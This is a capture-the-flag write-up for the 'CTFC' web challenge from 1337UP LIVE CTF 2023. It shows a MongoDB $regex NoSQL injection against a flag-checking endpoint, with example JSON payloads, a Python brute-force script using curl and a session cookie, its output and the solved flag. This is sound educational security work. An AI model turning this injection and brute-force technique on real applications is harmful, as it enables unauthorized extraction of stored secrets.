## CTFC
### Description
<sup>Author: Jopraveen</sup><br>
I'm excited to share my minimal CTF platform with you all, <br>take a look! btw it's ImPAWSIBLE to solve all challenges 😺

Note: flag format is INTIGRITI{.*}

`https://ctfc.ctf.intigriti.io` <br>
[CTFC.zip](https://github.com/0xSirawit/Capture-The-Flag-Events/raw/main/1337UP%20LIVE%20CTF%202023/Web%20Challenges/CTFC/CTFC.zip)
### Solution
![CTFC1](<https://raw.githubusercontent.com/0xSirawit/Capture-The-Flag-Events/main/1337UP%20LIVE%20CTF%202023/Web%20Challenges/CTFC/images/ctfc1.png>)
![CTFC2](<https://raw.githubusercontent.com/0xSirawit/Capture-The-Flag-Events/main/1337UP%20LIVE%20CTF%202023/Web%20Challenges/CTFC/images/ctfc2.png>)
After I loged in and played around in the website. It seem like when I submited a flag, The website show me `correct flag` in alert box.<br>
Let's look at the source code which I got from the challenge. Maybe we get some more infomation.

```py
def createChalls():
	db.challs.insert_one({"_id": "28c8edde3d61a0411511d3b1866f0636","challenge_name": "Crack It","category": "hash","challenge_description": "My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}","challenge_flag": "CTFC{cryptocat}","points": "500","released": "True"})
	db.challs.insert_one({"_id": "665f644e43731ff9db3d341da5c827e1","challenge_name": "MeoW sixty IV","category": "crypto","challenge_description": "hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters","challenge_flag": "CTFC{n0w_g0_4_th3_r34L_fl4G}","points": "1000","released": "True"})
	db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})
```

There is the third challenge that hide from us. and there is a comment in `app.py` said `# wait untill mongodb start then create the challs in db`, This is **mongodb** and they use `find_one()` function to check the flag in the database. 

```
chall_details = db.challs.find_one(
			{
			"_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
			"challenge_flag":submitted_flag
			}
	)
	if chall_details == None:
		return "wrong flag!"
	else:
		return "correct flag!"
```

After I searched info about mongodb and find_one() function.
We can inject [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) query operator in https request.

![CTFC4](https://raw.githubusercontent.com/0xSirawit/Capture-The-Flag-Events/main/1337UP%20LIVE%20CTF%202023/Web%20Challenges/CTFC/images/ctfc4.png)
The idea is **brute force characters** in the third challenge (_id=3) until it is the right character in the flag. If we get `correct flag!`, we will append the character to the payload and use that to continue brute forcing the next character until we get all of the flag characters.<br>
**Example**:
```
First payload: {"_id":"_id:3","challenge_flag":{"$regex":"INTIGRITI{<bruteforcing>.*}"}}
# 'h' get 'correct flag!' response so append 'h' in the payload: INTIGRITI{h<bruteforcing>.*}
Second payload: {"_id":"_id:3","challenge_flag":{"$regex":"INTIGRITI{h<bruteforcing>.*}"}}
# '0' get 'correct flag!' response so append '0' in the payload: INTIGRITI{h0<bruteforcing>.*}
# And so on until we get '}' charecter.
``` 

We know the idea, The Next step is to make a script to do the stuff for us.

```py
import subprocess
testcase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}"
data = '{"_id":"_id:3","challenge_flag":{"$regex": ".*"}}'
flag = 'INTIGRITI{'
while True:
    for i in testcase:
        data = '{"_id":"_id:3","challenge_flag":{"$regex": "' + flag+i + '.*"}}'
        result = subprocess.run(['curl','-s', '-X','POST','https://ctfc.ctf.intigriti.io/submit_flag','-b','session=eyJ1c2VyIjp7Il9pZCI6ImFjNDBiZDkzYzA2YTQ5ZWViOTVkOWIxZWRkNmIzYjRkIiwidXNlcm5hbWUiOiJ0ZXN0MTIzNCJ9fQ.ZVg2YQ.OwxwhpJzlPsuXH9uuTrLEPNZQQo', '-d', data, "-H" ,'Content-Type: application/json'], stdout=subprocess.PIPE)
        if "correct" in result.stdout.decode(): flag = flag+i
    print(flag)
    if flag[-1] == '}': break 
print('The Flag:',flag)
```
**Result:**
```bash
$ python3 solve_ctfc.py
INTIGRITI{h
INTIGRITI{h0
INTIGRITI{h0w_
INTIGRITI{h0w_1
INTIGRITI{h0w_1s
INTIGRITI{h0w_1s_
INTIGRITI{h0w_1s_7
INTIGRITI{h0w_1s_7h4
INTIGRITI{h0w_1s_7h4t_
INTIGRITI{h0w_1s_7h4t_P
INTIGRITI{h0w_1s_7h4t_PAW
INTIGRITI{h0w_1s_7h4t_PAWS
INTIGRITI{h0w_1s_7h4t_PAWSI
INTIGRITI{h0w_1s_7h4t_PAWSIBL
INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
The Flag: INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
```

> The Flag: INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
{: .prompt-tip }
